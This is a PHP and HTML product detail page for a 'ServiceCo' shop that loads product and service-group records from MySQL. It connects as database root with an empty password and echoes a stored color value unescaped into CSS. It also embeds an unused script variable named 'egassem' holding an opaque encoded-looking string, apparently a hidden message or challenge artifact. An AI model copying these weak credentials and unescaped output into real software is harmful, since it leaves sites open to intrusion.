<?php
if (!isset($_GET['productId'])) {
    die("Product ID not set.");
}

$conn = new mysqli("localhost", "root", "", "serviceco");

$productId = (int)$_GET['productId'];

$product_result = $conn->query("SELECT * FROM products WHERE id = $productId");

if ($product_result->num_rows > 0) {
    $product = $product_result->fetch_assoc();
    $productName = $product['name'];
    $productPrice = $product['price'];
    $productImage = $product['image'];
    $productUrl = $product['url'];
    $productDescription = $product['description'];
    $serviceGroupId = $product['service_group_id'];
} else {
    echo "Product not found.";
    exit;
}

$service_group_result = $conn->query("SELECT * FROM service_groups WHERE id = $serviceGroupId");

if ($service_group_result->num_rows > 0) {
    $service_group = $service_group_result->fetch_assoc();
    $groupName = $service_group['name'];
    $groupEmail = $service_group['email'];
    $groupLogo = $service_group['logo'];
    $groupColor = $service_group['color'];
    $groupUrl = $service_group['url'];
    $groupDescription = $service_group['description'];
    $groupFolder = $service_group['folder'];
} else {
    echo "Service group not found.";
    exit;
}

$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" type="image/x-icon" href="../logo.png">
        <title>ServiceCo</title>
        <style>
            html, body {
                height: 100%;
                margin: 0;
                display: flex;
                flex-direction: column;
            }

            body {
                font-family: 'Arial', sans-serif;
                background-color: #f9f9f9;
                padding: 0;
            }

            header {
                flex-shrink: 0;
                background-color: <?php echo $groupColor; ?>;
                padding: 1em 0;
                text-align: center;
                color: #fff;
            }

            header img {
                width: 100px;
                height: auto;
                transition: transform 0.3s ease;
            }

            header a:hover img {
                transform: scale(1.1);
            }

            header a {
                text-decoration: none;
                color: #fff;
            }

            main {
                flex-grow: 1;
                padding: 2em;
                max-width: 1200px;
                margin: 0 auto;
            }

            h1, h2 {
                color: #000;
            }

            h2 {
                border-bottom: 2px solid <?php echo $groupColor; ?>;
                padding-bottom: 0.5em;
            }

            .product-details {
                display: flex;
                align-items: flex-start;
                gap: 2em;
                margin-top: 2em;
            }

            .product-image img {
                max-width: 100%;
                height: auto;
                border-radius: 5px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }

            .product-description {
                font-size: 1.1em;
                color: #333;
            }

            .contact-info a {
                color: <?php echo $groupColor; ?>;
                text-decoration: none;
                font-weight: bold;
                transition: color 0.3s ease;
            }

            .contact-info a:hover {
                color: #333;
            }

            .home-button {
                display: inline-block;
                padding: 10px 20px;
                background-color: <?php echo $groupColor; ?>;
                color: #fff;
                text-decoration: none;
                border-radius: 5px;
                font-weight: bold;
                transition: background-color 0.3s ease, transform 0.3s ease;
            }

            .home-button:hover {
                background-color: #333;
                transform: scale(1.05);
            }

            footer {
                flex-shrink: 0;
                text-align: center;
                padding: 1em 0;
                background-color: #333;
                color: #fff;
            }

            /* Mobile Responsiveness */
            @media (max-width: 768px) {
                .product-details {
                    flex-direction: column;
                    align-items: center;
                    gap: 1em;
                }

                header img {
                    width: 80px;
                }

                main {
                    padding: 1em;
                }

                .home-button {
                    width: 100%;
                    text-align: center;
                }
            }
        </style>
        <script>var egassem = "z9MbDcm43640Sb31q80Jkl4fN0TT5Fidg_7S7p1f8tqVh_maxnaW1KULYi4zatlmCSqboylWiwW4EdVHiqhh-wTIZogg5fYc4J3noN1o0c6bsH_LUM1pSb9Oo7ZeZ1CBbtbuOESmhcqtSAML1v-JtWen4nicbVQ_bf2j_61URHTENj9cufV-eTCVj5uoHp88";</script>
    </head>
    <body>
        <header>
            <a href="<?php echo htmlspecialchars($groupFolder . '/index.php'); ?>">
                <img src="<?php echo htmlspecialchars($groupFolder . '/' . $groupLogo); ?>" 
                    alt="<?php echo htmlspecialchars($groupName); ?> Logo">
            </a>
            <h1><?php echo htmlspecialchars($groupName); ?></h1>
            <a href="../index.php" class="home-button">Back To ServiceCo</a>
        </header>
        <main>
            <section class="product-details">
                <div class="product-image">
                    <img src="<?php echo htmlspecialchars($groupFolder . '/' . $productImage); ?>" 
                         alt="<?php echo htmlspecialchars($productName); ?>">
                </div>
                <div class="product-info">
                    <h2><?php echo htmlspecialchars($productName); ?></h2>
                    <p class="product-price">฿<?php echo number_format($productPrice, 2); ?></p>
                    <p class="product-description"><?php echo nl2br(htmlspecialchars($productDescription)); ?></p>
                    <p class="contact-info">For more information, contact: <a href="mailto:<?php echo htmlspecialchars($groupEmail); ?>"><?php echo htmlspecialchars($groupEmail); ?></a></p>
                </div>
            </section>
        </main>
        <footer>
            <p>2025 <?php echo htmlspecialchars($groupName); ?></p>
        </footer>
    </body>
</html>
